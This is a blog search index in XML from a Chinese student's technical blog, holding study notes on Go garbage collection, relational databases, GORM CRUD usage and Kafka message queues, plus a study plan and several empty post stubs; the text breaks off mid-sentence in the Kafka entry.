<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>speed_up</title>
      <link href="/2025/01/speed-up/"/>
      <url>/2025/01/speed-up/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pku软件分析一</title>
      <link href="/2024/11/pku-sa/"/>
      <url>/2024/11/pku-sa/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> software analysis </tag>
            
            <tag> pl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息物理系统安全作业汇总</title>
      <link href="/2024/11/cps-hw/"/>
      <url>/2024/11/cps-hw/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>难顶，且不知道学了有啥用</p><h2 id="HW1">HW1</h2><h2 id="HW2">HW2</h2><h2 id="HW3">HW3</h2>]]></content>
      
      
      
        <tags>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>补坑计划</title>
      <link href="/2024/11/bkjh/"/>
      <url>/2024/11/bkjh/</url>
      
        <content type="html"><![CDATA[<p>开坑or补坑计划表</p><h2 id="2024-11">2024.11</h2><h3 id="算法">算法</h3><p>每天带着看看灵神的东西</p><ul><li>lc 题单 <a href="https://leetcode.cn/circle/discuss/48kq9d/">https://leetcode.cn/circle/discuss/48kq9d/</a></li><li>灵神刷题 <a href="https://leetcode.cn/circle/discuss/RvFUtj/">https://leetcode.cn/circle/discuss/RvFUtj/</a></li><li>灵神DP <a href="https://leetcode.cn/circle/discuss/tXLS3i/">https://leetcode.cn/circle/discuss/tXLS3i/</a></li><li>灵神算法 <a href="https://www.bilibili.com/video/BV1Xj411K7oF/?vd_source=c35e5a8a155a8438a63d9b344d7ea4cc">https://www.bilibili.com/video/BV1Xj411K7oF/?vd_source=c35e5a8a155a8438a63d9b344d7ea4cc</a></li></ul><h3 id="编译原理">编译原理</h3><p>看pku的软件分析的前置，当然可能过一遍龙书就去看软件分析了</p><ul><li>龙书，理解其中的抽象（动词，不是形容词）思想</li><li>NJU编译原理</li><li>PKU编译原理</li><li><a href="https://www.craftinginterpreters.com/">https://www.craftinginterpreters.com/</a></li></ul><h3 id="软件分析">软件分析</h3><p>师兄要求的</p><ul><li>pku 程序分析</li><li>nju 程序分析</li><li>spa <a href="https://cs.au.dk/~amoeller/spa/">https://cs.au.dk/~amoeller/spa/</a></li><li>太阿源码</li><li>《Software Foundations》，在线书籍，网址：<a href="https://softwarefoundations.cis.upenn.edu/%EF%BC%8C%E7%94%B1%E5%BF%97%E6%84%BF%E8%80%85%E7%BB%B4%E6%8A%A4%E7%9A%84%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91%E7%89%88%EF%BC%9Ahttps://coq-zh.github.io/SF-zh/">https://softwarefoundations.cis.upenn.edu/，由志愿者维护的中文翻译版：https://coq-zh.github.io/SF-zh/</a></li></ul><h3 id="csapp与mit6-s081补完计划">csapp与mit6.s081补完计划</h3><p>rt</p><h3 id="wp补完计划">wp补完计划</h3><p>rt，主要是ts、yl、das（最近就打了这三个）</p><h3 id="懂得都懂板块">懂得都懂板块</h3><p>mysql、redis、go开发相关、ddia、spring的项目。这个可以慢慢补</p><h3 id="missing-semester补完计划">missing-semester补完计划</h3><p>rt，<s>不着急</s>，git可以优先看看。pro git</p><h3 id="nju-pa和os">nju pa和os</h3><p>看情况，不急着开（补）坑，pa之前做了一部分，可以先找找。</p><h3 id="misc">misc</h3><ul><li>数学，不会有人研究生了还在补数理基础吧</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ylctf wp-crypto</title>
      <link href="/2024/11/yl-crypto/"/>
      <url>/2024/11/yl-crypto/</url>
      
        <content type="html"><![CDATA[<p>莫名其妙被博人哥拖去打密码了，所以还是先写写crypto的wp学习一下罢。yl和das的wp会补的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go性能优化(水)</title>
      <link href="/2024/09/test/"/>
      <url>/2024/09/test/</url>
      
        <content type="html"><![CDATA[<p>性能优化是为了提高软件的性能，减少不必要的开销。这可以有效提升用户体验与降低成本，提高资源利用率。</p><h2 id="一、自动内存管理">一、自动内存管理</h2><p>程序在运行时会根据需要动态分配内存（如malloc）。自动内存管理就是在程序运行时管理动态内存的机制。<br>主要作用：</p><ul><li>避免手动内存管理，开发者只需要关注于业务逻辑（更符合“Keep it simple, stupid”原则）</li><li>保证内存使用的正确性和安全性，可以有效防止在动态内存管理过程中出现的问题（如double-free、uaf等）<br>自动内存管理主要实现了三个任务：</li><li>为新对象分配空间</li><li>确定存活对象</li><li>回收已经不使用的对象的内存</li></ul><h3 id="1-相关概念">1.相关概念</h3><ul><li>Mutator:业务线程</li><li>Collector：GC线程，可以实现动态内存管理</li><li>Serial GC：只有一个Collector，多个Mutator共用。</li><li>Parallel GC：支持多个Collector。</li><li>Concurrent GC：Mutator和GC同时执行。<br>Concurrent GC需要Collectors感知对象的指向关系发生变化，因为在Mutator和GC线程的并发执行过程中，不可避免的会发生对象之间的引用、指向关系的改变（可能比较类似于访问临界区）。比如一个存活对象引用A对象时，GC会将二者都标记为存活对象，如果同时Mutator修改该存活对象使得它引用B对象，这就是对象的指向关系发生变化，需要GC去处理。</li></ul><h3 id="2-相关指标">2.相关指标</h3><ul><li>安全性（正确性）：不能回收存活对象。（这是GC的正确性基本要求）</li><li>吞吐量：1-（GC时间）/（程序执行总时间）</li><li>暂停时间</li><li>内存开销</li></ul><h3 id="3-追踪GC">3.追踪GC</h3><p>追踪GC本质上是将对象之间的引用关系抽象为一个图结构。<br>追踪GC中，全局变量（Global Var）以及栈（Stack)等区域的指针所指向的堆区(Heap)的对象视为根对象，之后GC会根据对象之间的引用关系不断遍历，从而将所有对象划分为两个集合——可达对象与不可达对象。不可达对象将会被视为未使用对象而被回收。<br>GC中有三种回收策略：</p><ul><li>Copying GC：将存活对象复制到另外的内存空间。因为复制需要额外的开销，所以通常在需要复制的对象较少时或必要时使用。</li><li>Mark-sweep GC：将未使用的对象的内存空间标记为可分配的，使用一个free链表来管理可供分配的动态管理区域（ptmalloc的free策略）。</li><li>Compact GC：原地整理对象，类似于Copying GC</li></ul><h3 id="4-分代GC">4.分代GC</h3><p>分代GC基于的假设是：很多对象分配出来以后很快就不再使用（如函数返回后，函数中定义的临时变量就不再使用）。分代GC是根据对象的存活周期，制定不同的策略。<br>主要的思路是：</p><ul><li>将不同年龄的对象置于heap的不同区域</li><li>对不同年龄的对象，制定不同的GC策略，降低整体内存管理开销</li><li>对于年轻代（经历过GC次数少，生命周期较短）的对象，由于很多对象在分配后很快不再使用，存活对象少，使用copying GC，复制的对象少，开销较小，GC吞吐率高。</li><li>对于老年代，对象存活周期长，反复复制开销大，所以采用mark-sweep GC</li></ul><h3 id="5-引用计数">5.引用计数</h3><p>每个对象都有与之关联的对象的数目（即引用它的指针的数目）。当且仅当引用数大于0时对象存活（未必，可能有循环引用）<br>优点：</p><ul><li>快：GC在程序执行过程的同时执行</li><li>GC不需要了解具体runtime实现细节<br>缺点：</li><li>原子操作：本质来说，引用计数属于临界区，需要使用原子操作来保证其正确性，会导致维护引用计数开销增大。</li><li>无法回收循环引用的对象</li><li>内存开销：引入额外内存空间存储引用计数</li></ul><h2 id="二、Go内存管理及优化">二、Go内存管理及优化</h2><h3 id="1-分块">1.分块</h3><p>在mmap()申请一块大内存后，再分配为大块（如8KB），称为mspan，进一步将mspan按照特定大小划分为更小的块，并设定对象是否包含指针（可以决定是否需要GC）。分配时按照对象大小分配。</p><h3 id="2-缓存">2.缓存</h3><p>维护mcache，优先mcache上分配，不够时向mcentral申请新mspan</p><h3 id="3-Balanced-GC">3.Balanced GC</h3><p>设计原理：对象分配高频，且小对象占比较高<br>解决的问题：内存分配流程长，耗时。<br>思路：</p><ul><li>每个goroutine分配一个大块内存（goroutine allocation buffer），用于noscan（无对象引用）的小对象分配</li><li>维护base、end、top指针</li><li>分配内存时只需移动top指针即可</li><li>设定阈值，当GAB大小超过阈值时，采用Copying GC将存活对象分配到其他GAB中，并释放源GAB。<br>本质思路就是：将多个小对象的分配合并为一个大对象。这样将频繁的减少了频繁分配小对象的开销。</li></ul><h2 id="三、编译器与静态分析">三、编译器与静态分析</h2><h3 id="1-静态分析">1.静态分析</h3><p>在不执行代码的情况下推导程序行为，分析程序性质。<br>主要采用控制流（程序语句的执行流程）与数据流（数据在控制流上的传递）<br>编译器的代码优化主要是根据静态分析得出的性质对代码进行简化</p><h3 id="2-过程内分析和过程间分析">2.过程内分析和过程间分析</h3><ul><li>过程内分析：仅分析函数内部</li><li>过程间分析：考虑多个函数间调用与返回的关系，需要同时考虑控制流与数据量，较复杂</li></ul><h3 id="3-优化思路">3.优化思路</h3><p>主要思路：用编译时间换运行时间（仅指产品上线）</p><ul><li>函数内联：将被调用函数复制到主调函数中，从而将过程间分析转为过程内分析（问题转化）。也可以减少函数调用开销</li><li>Beast Mode：调整Go语言内联策略，让更多函数内联。</li><li>逃逸分析：分析代码指针的作用域，未逃逸的对象可以在栈上分配。（Beast Mode可以让更多变量不逃逸）</li></ul><p>总结：考虑了在底层对Go进行优化<br>在Go语言动态内存分配方向，主要是减少了频繁的小对象申请内存的开销，大大提升了性能。<br>在编译器优化方面，主要思路是减小编译器的静态分析的复杂度，从而生成更高质量的机器代码。</p><h2 id="后记">后记</h2><p>看标题就知道有多水了</p>]]></content>
      
      
      <categories>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDBMS概览</title>
      <link href="/2024/09/test1/"/>
      <url>/2024/09/test1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>之前写的水文，搬看个乐子就好了</p><h2 id="一、ACID特性与案例">一、ACID特性与案例</h2><h3 id="1-RDBMS事务ACID特性">1.RDBMS事务ACID特性</h3><p>事务(Transaction) 是由一组SQL语句组成的一个程序执行单元(Unit)， 它需要满足ACID特性。</p><ul><li>原子性(Atomicity)：事务是一个不可再分割的工作单元，事务中的操作要么都发生，要么都不发生。</li><li>一致性(Consistency)：数据库事务不能破坏关系数据的完整性以及业务逻辑上的一致性。</li><li>隔离性(Isolation)：多个事务并发访问时，事务之间是隔离的，一个事务不应该影响其它事务运行效果。</li><li>持久性(Durability)：在事务完成以后，该事务所对数据库所做的更改便持久的保存在数据库之中，并不会被回滚。</li></ul><h3 id="2-案例">2.案例</h3><p>我们可以设想一个例子，A给B转100元，需要执行的操作是A的账户减100元，B的账户加100元，如果我们的转账行为要满足ACID：</p><ul><li>原子性要求：假如A账户已经扣款，我们必须要保证B的账户加上100元，不能在A扣款后，B收不到钱，即A扣款和B加钱要么同时成功要么同时失败。</li><li>一致性要求：加入A账户余额小于100，我们要保证A的转账操作不会发生，即每个操作必须是合法的（A账户转账金额大于余额是不合法的），应该由一个有效状态到另一个有效状态。</li><li>隔离性要求：假如A和C同时给B转账，需要保证B能够同时接收到A和C的钱，即两个操作并发操作时，应该互不影响。</li><li>持久性要求：数据更新成功后，结果应该永久保留（即保存到非易失性介质中），不能因为宕机等情况丢失。<br>当然可能还需要满足其他要求：如高并发（同时有1千万人给B转账，需要快速处理）、高可靠（服务不会随意宕机）</li></ul><p>总的来说，ACID是事务的基本性质，必须要满足ACID特性，才能够保证事务的执行是正确的，不会发生意想不到的错误，也即ACID特性是事务正确性的前提。</p><h2 id="二、发展历史">二、发展历史</h2><p>人工-&gt;文件-&gt;DB</p><h3 id="1-DBMS模型">1.DBMS模型</h3><ul><li>网状模型：用有向图表示实体和实体之间的联系的模型</li><li>层次模型：用树形结构表示实体与实体的层次关系</li><li>关系模型（关系型数据库）：将关系用二维表形式表示</li></ul><h2 id="三、关键技术">三、关键技术</h2><h3 id="1-SQL引擎——Parser">1.SQL引擎——Parser</h3><p>主要包括词法分析、语法分析、语义分析等过程<br>词法分析主要是将SQL语句拆分为关键字、目标表、列名、常数、运算符等部分，语法分析分析出SQL语句各个部分的构成，再通过语义分析是否合法。</p><h3 id="2-Optimizer">2.Optimizer</h3><p>为什么使用Optimizer：可以有效简化计算和执行路径，有效提高SQL语句的执行性能。<br>（1）RBO（基于规则的优化器）<br>条件化简：通过数据流和执行流分析表达式最简单的形式，如<code>a = 5 and b &gt; a</code>可以化简为<code>a = 5 and b &gt; 5</code>。<br>表连接优化：总是小表先连接<br>Scan优化<br>（2）CBO（基于代价的优化器）<br>选择代价最低的执行方案</p><h3 id="3-Executor">3.Executor</h3><p>（1）火山模型：思路是向下访问（每个Operator访问下层Operator），向上求解（每个Operator求解出结果后返回上层）<br>优点：低耦合，逻辑简单<br>缺点：函数调用多，效率低<br>（2）向量化：一次计算一批数据，向上层返回一个向量<br>优点：性能更好（Cache命中率高、可以利用SIMD机制等）<br>（3）编译执行</p><h3 id="4-存储引擎：InnoDB">4.存储引擎：InnoDB</h3><p>存储引擎负责了数据的底层存储、管理和访问工作。5.6之后的的版本MySQL默认存储引擎为Innodb,它具有支持事务,支持外键,支持行级锁以及崩溃恢复等特性,是目前比较优秀的存储引擎。</p><ul><li>Buffer Pool：存储引擎位于内存中的重要结构，用于缓存数据，减少磁盘IO的开销。在实际使用过程中采用了冷热分离机制，减少了热数据频繁切入切出的开销。</li><li>Page：存储基本单位（类似于操作系统中的页机制）</li><li>B+树：索引结构</li></ul><h3 id="5-事务引擎">5.事务引擎</h3><ul><li>UndoLog：保证原子性，当原子操作未完成时，依赖Log进行回滚</li><li>锁：保证隔离性</li><li>MVCC：保证隔离性，读写不阻塞，可以防止死锁</li><li>持久性：一是在事务提交前写入磁盘，二是维护Redo Log，若写入前发生故障，MySQL会根据Log重做事务。</li></ul>]]></content>
      
      
      <categories>
          
          <category> database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 GORM连接数据库，并实现crud</title>
      <link href="/2024/09/test3/"/>
      <url>/2024/09/test3/</url>
      
        <content type="html"><![CDATA[<p>可以参考<a href="https://gorm.io/">官方文档</a>及<a href="https://gorm.cn/zh_CN/docs/index.html">其中文版</a>进行学习（总的来说文档还是挺清楚的）</p><h2 id="一、ORM简介">一、ORM简介</h2><p>在Web开发过程中不可避免的要操作数据库，编程语言原生的数据库模块有一系列问题。如执行效率问题、设计难度问题、迁移问题和安全性问题。<br>ORM（Object Relational Mapping，即对象关系映射），使得我们可以基于面向对象的思想去编写类、对象、调用相应的方法等，ORM会将其转换/映射成原生SQL然后操作数据库。ORM将数据库中的表转为程序中的对象，通过建立对象和关系数据之间的映射模型，可以将一个表对应一个类；将一条记录对应一个对象。<br>GORM是Go语言的一个ORM库，我们可以利用GORM和Go语言实现对数据库的操作。</p><h2 id="二、GORM特性">二、GORM特性</h2><p>摘自官方文档，包括</p><ul><li>全功能</li><li>支持事务</li><li>开发者友好<br>…</li></ul><h2 id="三、GORM操作">三、GORM操作</h2><h3 id="1-安装">1.安装</h3><p>通过以下命令安装，注意需要先初始化go module，如果没有需要执行<code>go mod init</code>。<br>这里我们主要是实现对sqlite进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go get -u gorm.io/gorm</span><br><span class="line">go get -u gorm.io/driver/sqlite</span><br></pre></td></tr></table></figure><h3 id="2-导入">2.导入</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">   <span class="string">&quot;gorm.io/driver/sqlite&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其中<code>gorm.io/gorm</code>是GORM的核心库，<code>gorm.io/driver/sqlite</code>是数据库驱动，用于操作sqlite数据库。GORM还支持<code>MySQL</code>、<code>SQLServer</code>等主流数据库。</p><h3 id="3-连接数据库">3.连接数据库</h3><p>我们通常使用<code>gorm.Open</code>方法建立数据库连接，与SQLite建立连接的代码如下（我们创建了一个名为<code>test.db</code>的数据库文件，并于它连接）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db, err := gorm.Open(sqlite.Open(<span class="string">&quot;test.db&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="built_in">panic</span>(<span class="string">&quot;Connect failed&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-模型定义">4.模型定义</h3><p>模型是标准的 struct，只需要按照Go语言标准定义一个struct即可。</p><h3 id="5-gorm-Model">5.gorm.Model</h3><p><code>gorm.Model</code>是一个GORM中提供的内置结构体，包含以下常用字段：</p><ul><li>ID：主键</li><li>CreatedAt：创建时间</li><li>UpdatedAt：更新时间</li><li>DeletedAt：删除时间（软删除）<br>通常我们可以通过以下的方式将<code>gorm.Model</code>嵌入我们定义的结构体中，这样我们定义的结构体也拥有了<code>gorm.Model</code>的字段。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">   gorm.Model</span><br><span class="line">   UserName <span class="type">string</span></span><br><span class="line">   Age <span class="type">uint</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-高级选项">6.高级选项</h3><p>（1）嵌入<br>可以通过<code>gorm:&quot;embedded&quot;</code>将一个结构体A嵌入另一个结构体B，这样B结构体同样具有了A结构体的字段。<br>如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Author <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name  <span class="type">string</span></span><br><span class="line">    Email <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Blog <span class="keyword">struct</span> &#123;</span><br><span class="line">  ID      <span class="type">int</span></span><br><span class="line">  Author  Author <span class="string">`gorm:&quot;embedded&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）读写控制<br>还可以通过对结构体字段添加标签，实现对结构体字段的读写权限的控制。<br>因为涉及的标签较多，请参考<a href="https://gorm.io/docs/models.html">GORM官方文档</a>的说明。</p><h2 id="四、GORM实现CRUD（增删改查）">四、GORM实现CRUD（增删改查）</h2><h3 id="1-增">1.增</h3><p>新增一条记录，通常我们使用<code>db.Create</code>方法并且传入一个结构体指针。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.Create(&amp;User&#123;Name:<span class="string">&quot;A&quot;</span>, Age:<span class="number">18</span>&#125;)</span><br></pre></td></tr></table></figure><p>如果需要批量更新的话，我们会创建一个结构体的slice，并将slice传递给<code>db.Create</code>方法。如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> users = []User&#123;</span><br><span class="line">   &#123;Name: <span class="string">&quot;B&quot;</span>, Age: <span class="number">20</span>&#125;, </span><br><span class="line">   &#123;Name: <span class="string">&quot;C&quot;</span>, Age:<span class="number">30</span>&#125;, </span><br><span class="line">   &#123;Name: <span class="string">&quot;D&quot;</span>, Age:<span class="number">24</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">db.Create(&amp;users)</span><br></pre></td></tr></table></figure><p>GORM将自动填入主键，并生成SQL语句插入所有数据。<br>GORM还支持使用选定的字段创建对象。<br>使用<code>db.Select</code>方法时，我们传入参数作为需要被赋值（更新）的字段，使用<code>db.Create</code>方法时，GORM会创建一条记录，并且将<code>db.Select</code>中指定的字段的值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user1 := User&#123;Name: <span class="string">&quot;E1&quot;</span>, Age:  <span class="number">20</span>&#125;</span><br><span class="line">db.Select(<span class="string">&quot;Name&quot;</span>).Create(&amp;user1)</span><br></pre></td></tr></table></figure><p>使用<code>db.Omit</code>方法可以在创建记录时，不对某一字段进行赋值（即排除了某一字段）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user2 := User&#123;Name:<span class="string">&quot;E2&quot;</span>, Age: <span class="number">21</span>&#125;</span><br><span class="line">db.Omit(<span class="string">&quot;Age&quot;</span>).Create(&amp;user2)</span><br></pre></td></tr></table></figure><p>需要注意的是，GORM会默认处理一些字段，即使我们没有设定这些字段的值</p><ul><li>有PrimaryKey标签的字段，会自动创建，即便不在Select中</li><li>有Default标签的字段，会直接赋值为设定的默认值</li><li>模型中的CreatedAt，UpdatedAt等通用字段会被自动创建</li></ul><h3 id="2-条件">2.条件</h3><p>GORM中使用<code>db.Where</code>方法设定条件，这在查、改、删等操作时非常有效。<br>通常可以在<code>db.Where</code>中传入字符串，字典，切片等方法作为条件，具体可以参考官方文档。<br>GORM还将SQL语句的<code>order</code>、<code>group</code>、<code>limit</code>等子句抽象成了方法，可以在增删改查操作前进行设定。<br>GORM的删改查方法还支持内联条件，即将条件作为参数传入函数。</p><h3 id="3-查">3.查</h3><p>可以调用<code>First</code>、<code>Last</code>、<code>Take</code>等方法获取符合条件的单个对象。这些方法返回一个对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oneUser User</span><br><span class="line"><span class="keyword">var</span> lastUser User</span><br><span class="line">db.First(&amp;oneUser)</span><br><span class="line">db.Last(&amp;lastUser, User&#123;age: <span class="number">20</span>&#125;)</span><br></pre></td></tr></table></figure><p>可以调用<code>Find</code>方法返回一组对象，通常需要用一个对象切片接收</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> users []User</span><br><span class="line">db.Find(&amp;users)</span><br><span class="line">db.Where(<span class="string">&quot;age = ?&quot;</span>, <span class="string">&quot;20&quot;</span>).Find(&amp;users)</span><br></pre></td></tr></table></figure><h3 id="4-改">4.改</h3><p>使用Update更新</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.Model(&amp;User&#123;&#125;).Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;A&quot;</span>).Update(<span class="string">&quot;age&quot;</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><h3 id="5-删">5.删</h3><p>GORM中利用<code>db.Delete</code>方法删除记录。</p><h4 id="5-1-物理删除">5.1 物理删除</h4><p>通常情况下，GORM删除一个记录采用物理删除的方式，即彻底从文件系统中删除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> NewUser <span class="keyword">struct</span> &#123;</span><br><span class="line">   Name <span class="type">string</span></span><br><span class="line">   Age <span class="type">uint</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除一条记录</span></span><br><span class="line">db.Delete(&amp;User&#123;&#125;, <span class="number">4</span>)</span><br><span class="line"><span class="comment">// DELETE from `users` where `users`.`id` = 4;</span></span><br><span class="line"><span class="comment">// 批量删除</span></span><br><span class="line">db.Delete(&amp;User&#123;&#125;, []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;)</span><br><span class="line"><span class="comment">// 依照条件删除</span></span><br><span class="line">db.Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;A&quot;</span>).Delete(&amp;User&#123;&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>需要注意的是，当<code>Delete</code>方法不添加主键时，默认为批量删除。如果没有指定主键且指定了删除的条件（Where方法），则GORM会删除所有匹配的选项。如果在没有任何条件的情况下执行批量删除，GORM 不会执行该操作，并返回 <code>ErrMissingWhereClause</code>错误</p></blockquote><h4 id="5-2-软删除">5.2 软删除</h4><p>如果模型包含了一个 <code>gorm.deletedat</code>字段（<code>gorm.Model</code>已经包含了该字段)，调用<code>db.Delete</code>将自动执行软删除。软删除指记录仍然存在于文件系统中，但我们无法通过正常的查询操作查询到该记录。GORM 会将 <code>DeletedAt</code> 置为当前时间，表示该对象已被删除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age  <span class="type">uint</span></span><br><span class="line">&#125;</span><br><span class="line">db.Delete(&amp;User&#123;&#125;, <span class="number">5</span>)</span><br><span class="line">db.Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;A&quot;</span>).Delete(&amp;User&#123;&#125;)</span><br></pre></td></tr></table></figure><h4 id="5-3-操作被软删除的记录">5.3 操作被软删除的记录</h4><p>可以使用<code>Unscoped</code>找到被软删除的记录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">users := <span class="built_in">make</span>([]User, <span class="number">10</span>)</span><br><span class="line">db.Unscoped().Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;A&quot;</span>).Find(&amp;users)</span><br></pre></td></tr></table></figure><p>我们还可以使用<code>Unscoped</code>也可以实现对软删除数据的物理删除</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.Unscoped().Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;A&quot;</span>).Delete(&amp;User&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="五、总结">五、总结</h2><ul><li><ol><li>使用时要导入gorm核心包以及对应的数据库的驱动包</li></ol></li><li><ol start="2"><li>创建时使用<code>db.Create</code>方法，传入一个对象或对象切片</li></ol></li><li><ol start="3"><li>GORM中可以使用<code>Where</code>、<code>Limit</code>、<code>Order</code>等方法设定需要满足的条件</li></ol></li><li><ol start="4"><li>查找使用<code>db.First</code>等方法可以查找单条对象，使用<code>db.Find</code>可以查找多条对象，可以指定条件</li></ol></li><li><ol start="5"><li>使用<code>db.Update</code>来更新单列，<code>db.Updates</code>更新多列</li></ol></li><li><ol start="6"><li>若包含<code>gorm.deletedat</code>会进行软删除，否则是物理删除。</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> golang </tag>
            
            <tag> database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息队列概述</title>
      <link href="/2024/09/test4/"/>
      <url>/2024/09/test4/</url>
      
        <content type="html"><![CDATA[<h2 id="提醒">提醒</h2><p>巨水无比，最水的一集</p><h2 id="一、消息队列应用场景">一、消息队列应用场景</h2><p>最常见的是：解耦、削峰、异步、日志处理</p><ul><li>解耦：各个模块只需要对消息队列进行操作，业务逻辑相对独立。</li><li>削峰：可以控制流量，避免业务挂掉。</li><li>异步：如果下游接口返回的数据不是必要的，则可以将用户请求交给消息队列，消息队列交给下游的模块接口处理，用户不必等待所有接口处理完成返回，也可以缓解串行处理的时延问题。</li><li>日志处理：可以处理大规模日志数据的传输问题（类似于削峰）</li></ul><h2 id="二、Kafka">二、Kafka</h2><h3 id="1-适用场景">1.适用场景</h3><p>直播、订单、搜索服务</p><h3 id="2-使用方法">2.使用方法</h3><p>创建Kafka集群-&gt;创建Topic-&gt;设计生产者逻辑，初始化生产者，发送消息-&gt;设计消费者逻辑，初始化消费者，接收消息</p><h3 id="3-基本概念">3.基本概念</h3><p>Kafka的基础架构为：</p><ul><li>Topic：逻辑队列，一个 Topic 中拥有多个Partition（Kafka的物理分区）。一个Topic看作是一组具有相同主题的消息。</li><li>Cluster：物理集群，每个集群中可以建立多个不同的 Topic。</li><li>Producer：生产者，负责将业务消息发送到 Topic 中。</li><li>Consumer：消费者，负责接收并处理Topic 中的消息。</li><li>ConsumerGroup：消费者组，包含多个消费者，每个消费者的消费进度互不干涉。<br>Kafka中的其他基本概念</li><li>Offset：消息在 Partition 内的相对位置信息，可以理解为唯一 ID，在 Partition 内部严格递增。我们可以利用 Partition 和Offset唯一地定位一个消息</li><li>Replica：Partition 的副本，主要作用是容灾，这些副本有着不同的角色，分别是 Leader 和 Follower。Leader 对外提供数据；Follower 